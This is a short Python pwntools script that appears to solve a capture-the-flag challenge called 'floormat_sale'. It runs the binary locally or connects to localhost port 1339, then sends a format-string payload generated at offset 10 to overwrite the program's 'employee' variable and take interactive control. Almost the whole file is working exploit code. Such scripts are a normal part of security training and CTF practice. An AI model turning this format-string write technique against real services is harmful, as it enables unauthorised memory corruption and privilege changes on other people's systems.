#!/usr/bin/env python3

# ruff: noqa: F403, F405


from pwn import *
from pwnlib import gdb

elf = context.binary = ELF("./floormat_sale_patched", checksec=False)
binary_path = elf.path
cwd = str(Path.cwd())


gdb.binary = lambda: "gef-bata24"


def start(argv=[], *a, **kw):
    nc = "nc localhost 1339"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [binary_path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(
                args=args_,
                env=env,
                gdbscript=gdbscript,
                api=True,
                # sysroot=cwd,
                sysroot=None,
            )
        return process(args_, env=env, *a, **kw)


env = {}

# when there is no need for custom env, this should be set to None
# for some reason when we pass empty dictionary to `gdb.debug`, `pwntools` would
# still launch `gdbserver` with `--wrapper env -i` flag which result in the first
# thing to be debugged is `bash` then `env` and finally our target binary
#
# https://github.com/Gallopsled/pwntools/blob/96d98cf192cf1e9bc5d6bbeff5311e8961e58439/pwnlib/gdb.py#L347
# should have checked `len(env_args) > 0` instead of `env is not None`

if len(env) == 0:
    env = None

gdbscript = """
# source ~/.gdbinit-gef-bata24.py
b *main+392
c
"""


def ef(payload: bytes):
    _io = start()
    _io.sendlineafter(b"choice:", b"6")
    _io.sendlineafter(b"address:", payload)
    _io.recvline()
    _io.recvline()
    _io.recvline()
    _io.recvline()
    r = _io.recvline()
    _io.close()
    # _io.interactive()
    return r


# ef(b"%p")
# fs = FmtStr(execute_fmt=ef)

offset = 10

io = start()

payload = fmtstr_payload(offset, writes={elf.sym["employee"]: 1}, write_size="byte")
io.sendlineafter(b"choice:", b"6")
io.sendlineafter(b"address:", payload)

io.interactive()
